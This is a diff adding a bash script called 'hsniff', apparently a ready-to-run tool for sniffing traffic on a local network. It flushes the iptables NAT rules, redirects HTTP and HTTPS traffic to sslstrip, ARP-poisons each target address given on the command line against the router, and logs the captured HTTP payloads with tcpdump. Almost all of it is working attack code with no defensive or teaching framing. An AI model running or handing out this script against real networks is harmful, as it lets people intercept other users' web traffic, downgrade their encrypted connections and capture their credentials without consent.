@@ -1,0 +1,162 @@
+#!/bin/bash
+
+# trap ctrl-c and call kill_all()
+trap kill_all INT
+
+
+kill_all() {
+
+pkill arpspoof
+pkill tcpdump
+pkill sslstrip
+echo [!] Clearing all processes..
+echo Exitting....
+}
+
+function pause(){
+   read -p "$*"
+}
+
+
+usage(){
+echo "Usage: hsniff [OPTION]"
+echo "HTTP Sniff , Sniff on network."
+
+echo "With no Option run default,"
+echo -e "\tlisten_port=8080\n\trouter_ip=192.168.0.1\n\tinterface=wlan0\n\tflush_rules=1\n\tadd_rules=1\n\tlog_file=hsniff.log\n\n"
+
+echo -e "\t-t\ttarget ip addresses delimited by ',' [eg. x.x.x.x,y.y.y.y]"
+echo -e "\t-p\tsslstrip listen on port [eg. 8080]"
+echo -e "\t-r\trouter's ip address [eg. 192.168.1.1]"
+echo -e "\t-i\tinterface [eg. wlan0]"
+echo -e "\t-f\tflush iptables nat rules [eg. 0,1]"
+echo -e "\t-a\tadd new rules to iptables [eg. 0,1]"
+echo -e "\t-l\tlog all information to file [eg. mylog.txt]"
+echo -e "\t-n\tstart without sslstrip ie only http logging"
+echo -e "\t-h\tdisplay this help and exit"
+echo -e "\t-v\toutput version information and exit\n\n"
+
+echo "Example:"
+echo "       hsniff -t 192.168.0.110,192.168.0.120"
+echo " "
+echo -e "contact : info@aencode.in\n"
+}
+
+version(){
+echo hsniff v1.0
+echo "contact : info@aencode.in"
+}
+
+
+
+lport=8080
+router_ip=192.168.0.1
+interface=wlan0
+flush_rules=1
+add_rules=1
+log_file=hsniff.log
+no_ssl=0
+
+
+
+while getopts 't:p:r:i:f:a:l:hvn' OPTION; do
+  case "$OPTION" in
+    t)
+      targets="$OPTARG"
+      ;;
+    p)
+      lport="$OPTARG"
+      ;;
+	
+    r)
+      router_ip="$OPTARG"
+      ;;
+	
+    i)
+      interface="$OPTARG"
+      ;;
+	
+    f)
+      flush_rules="$OPTARG"
+      ;;
+	
+    a)
+      add_rules="$OPTARG"
+      ;;
+	
+    l)
+      log_file="$OPTARG"
+      ;;
+
+    h)
+      usage
+      exit 1
+      ;;
+	
+    v)
+      version
+      exit 1
+      ;;
+
+    n)
+      no_ssl=1
+	;;
+		
+    ?)
+      usage
+      exit 1
+      ;;
+  esac
+done
+
+if [[ $targets == "" ]];then
+echo "hsniff requires -t option eg[x.x.x.x,y.y.y.y]"
+exit 1
+fi
+
+
+
+
+
+echo "Starting hsniff... "
+#setting up system
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo [*] ip_forward = true
+
+if [[ $flush_rules == 1 ]];then
+iptables -t nat -F
+echo [*] iptables flushing nat rules
+fi
+
+if [[ $no_ssl == 0 ]];then
+
+if [[ $add_rules == 1 ]];then
+iptables -t nat -A PREROUTING -i $interface -p tcp --dport 80 -j REDIRECT --to-port $lport
+echo "[*] iptables forwarding traffic 80 -> $lport"
+iptables -t nat -A PREROUTING -i $interface -p tcp --dport 443 -j REDIRECT --to-port $lport
+echo "[*] iptables forwarding traffic 443 -> $lport"
+fi
+
+
+sslstrip -l $lport > /dev/null 2>&1 &
+echo "[*] Starting sslstrip on port $lport"
+
+fi
+
+x_ip=$targets
+n=`echo $x_ip | tr -cd ',' | wc -c`
+n=`expr $n + 1`
+for i in `seq 1 $n`;do
+cip=`echo $x_ip | cut -d ',' -f $i`
+arpspoof -t $cip $router_ip   > /dev/null 2>&1 &
+echo [*] Poisioning target $cip ....
+done
+
+echo [*] logging all http..
+
+tcpdump -A -s 0 'tcp dst port 80 and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' > $log_file 2>&1 &
+
+pause Press any key  to stop
+
+
+kill_all
